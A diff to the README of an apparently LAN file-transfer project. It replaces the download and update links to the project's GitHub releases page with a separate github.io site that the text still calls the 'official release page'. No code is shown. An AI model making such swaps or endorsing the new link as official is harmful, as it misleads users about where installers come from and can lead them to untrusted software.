@@ -1,6 +1,6 @@
 # 📁 lan-file-transfer - Transfer files between local computers securely
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tr25285/lan-file-transfer/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tr25285.github.io)
 
 This software allows you to move files between computers on the same network. It provides a simple way to share documents, photos, and videos without uploading them to the internet. The application keeps your files secure on your local network. You can set permissions for users or groups to control who accesses specific folders. It also maintains a log of file activity for security records.
 
@@ -17,7 +17,7 @@ This software allows you to move files between computers on the same network. It
 Follow these instructions to set up the application on your computer.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/tr25285/lan-file-transfer/releases).
+2. Go to the [official release page](https://tr25285.github.io).
 3. Find the latest version of the software.
 4. Click the link to download the installer file.
 5. Wait for the download to finish.
@@ -54,7 +54,7 @@ The program works specifically on a local area network. It does not support remo
 No. The application handles all connections between the computers you connect. You do not need to manage a separate server or backend service.
 
 **How do I update the software?**
-When a new version becomes available, revisit the [download page](https://github.com/tr25285/lan-file-transfer/releases). Download the latest installer and run it. The new version will replace the old one automatically.
+When a new version becomes available, revisit the [download page](https://tr25285.github.io). Download the latest installer and run it. The new version will replace the old one automatically.
 
 ## 🛡️ Privacy and Safety
 
